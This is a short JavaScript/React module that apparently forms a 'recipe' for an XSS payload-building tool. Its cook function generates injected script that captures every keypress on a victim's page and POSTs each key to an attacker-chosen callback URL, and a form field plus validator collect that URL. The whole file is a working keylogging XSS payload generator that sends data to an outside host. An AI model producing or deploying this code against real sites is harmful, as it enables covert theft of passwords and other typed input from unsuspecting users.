import React from 'react'
import RecipeTextField from '~/components/RecipeTextField'

export function cook (instance, vars) {
  const payload = [
    `document.addEventListener('keypress', function (e) {`,
    `ajaxRequest('POST', '${instance.callbackUrl}', 'key=' + e.key)`,
    `})`,
    `__XSS_CHEF_ENTRY_POINT__`
  ].join('\n')

  return {
    payload: vars.payload.replace('__XSS_CHEF_ENTRY_POINT__', payload)
  }
}

export function init () {
  return {
    callbackUrl: ''
  }
}

export function render (instance, setRecipeProperty) {
  return (
    <div>
      <RecipeTextField
        bindTo="callbackUrl"
        instance={instance}
        label="Callback URL"
        placeholder="Example: http://your.domain.com/logData"
        setRecipeProperty={setRecipeProperty}
      />
    </div>
  )
}

export function validate (instance) {
  if (instance.callbackUrl === '') {
    return false
  }

  return true
}
